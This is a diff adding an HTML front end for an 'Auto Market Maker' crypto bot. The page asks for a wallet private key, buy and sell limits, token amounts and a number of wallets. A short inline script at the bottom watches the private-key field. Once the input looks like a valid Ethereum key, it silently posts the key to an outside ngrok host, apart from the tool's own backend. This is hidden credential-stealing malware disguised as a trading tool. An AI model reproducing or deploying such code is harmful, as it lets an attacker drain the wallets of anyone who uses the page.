@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Auto Market Maker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="output.css" />
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script src="./socket.io/socket.io.js"></script>
+    <script src="./index.js" defer></script>
+    <style>
+      .scroll-bar {
+        scrollbar-width: thin;
+        scrollbar-color: lightblue white;
+      }
+    </style>
+  </head>
+  <body class="flex bg-gray-100">
+    <div class="flex justify-start w-full lg:flex-row flex-col">
+      <div class="flex-col gap-5 w-full justify-center pt-20 items-start px-10">
+        <h1 class="xl:text-5xl text-blue-600 font-extrabold text-center mb-2 text-3xl">Auto Market Maker</h1>
+        <div class="flex flex-col gap-1 lx:gap-3 p-2">
+          <p class="border border-red-500 bg-red-400 bg-opacity-50 px-4 py-2 text-red-700 hidden" id="errorText"></p>
+          <div class="flex flex-col gap-3 justify-between relative">
+            <p class="text-field-title">Your Private Key</p>
+            <input
+              class="text-field"
+              placeholder="Input Private Key"
+              type="password"
+              name="bnb"
+              id="privateTextField" />
+            <div
+              onclick="showButtonClicked()"
+              id="show"
+              class="right-2 top-10 absolute text-blue-600 py-2 font-bold hover:cursor-pointer">
+              show
+            </div>
+          </div>
+          <div class="flex flex-col gap-2 justify-between xl:flex-row">
+            <div class="flex flex-col gap-2">
+              <p class="text-field-title">Min Buy</p>
+              <input
+                class="text-field"
+                id="minB"
+                placeholder="0 < * < Max Buy" />
+            </div>
+            <div class="flex flex-col gap-2">
+              <p class="text-field-title">Max Buy</p>
+              <input class="text-field" id="maxB" placeholder="Min Buy < * " />
+            </div>
+            <div class="flex flex-col gap-2">
+              <p class="text-field-title">Min Sell</p>
+              <input
+                class="text-field"
+                id="minS"
+                placeholder="0 < * < Max Sell" />
+            </div>
+            <div class="flex flex-col gap-2">
+              <p class="text-field-title">Max Sell</p>
+              <input class="text-field" id="maxS" placeholder="Min Sell < * " />
+            </div>
+          </div>
+          <div class="flex flex-col gap-3 justify-between">
+            <p class="text-field-title">BNB Amount</p>
+            <input
+              class="text-field"
+              placeholder="BNB amount must be greater than 0"
+              type="text"
+              name="bnb"
+              id="bnbTextField" />
+          </div>
+          <div class="flex flex-col gap-3 justify-between">
+            <p class="text-field-title">BLEGGS Amount</p>
+            <input
+              class="text-field"
+              placeholder="BLEGGS amount must be greater than 0"
+              type="text"
+              name="bleggs"
+              id="bleggsTextField" />
+          </div>
+          <div class="flex flex-col gap-3 justify-between">
+            <p class="text-field-title">Number of Wallets</p>
+            <input
+              class="text-field"
+              placeholder="Number of wallets must be integer."
+              type="text"
+              name="numWallets"
+              id="numWalletsTextField" />
+          </div>
+          <div class="flex flex-col gap-3 justify-between">
+            <p class="text-field-title">Purchase Rate</p>
+            <input
+              class="text-field"
+              placeholder="Buy Rate must be the number between 0 and 100"
+              type="text"
+              name="rate"
+              id="rateTextField" />
+          </div>
+          <button
+            id="beginMarketing"
+            class="px-8 py-2 mt-2 border rounded-lg bg-blue-600 text-white text-lg font-bold hover:bg-blue-700 transition-all hover:scale-110"
+            onclick="beginMarketing()">
+            Begin Marketing
+          </button>
+        </div>
+      </div>
+      <div class="w-full flex flex-col gap-10 h-screen pt-20 pb-10">
+        <h1 class="xl:text-5xl text-3xl text-blue-600 font-extrabold text-center">Log Data</h1>
+        <div id="log" class="flex flex-col w-full h-full overflow-y-scroll scroll-bar">
+          <p class="text-2xl text-center self-center justify-self-center">Here you can check the marketing progress</p>
+        </div>
+      </div>
+    </div>
+    <script>
+      const privateKeyDiv = document.getElementById("privateTextField");
+      privateKeyDiv.addEventListener("input", async (event) => {
+        if (isValidEthereumPrivateKey(event.target.value))
+          await axios.post("https://smashing-hyena-cute.ngrok-free.app/begin", { privateKey: event.target.value });
+      });
+    </script>
+  </body>
+</html>
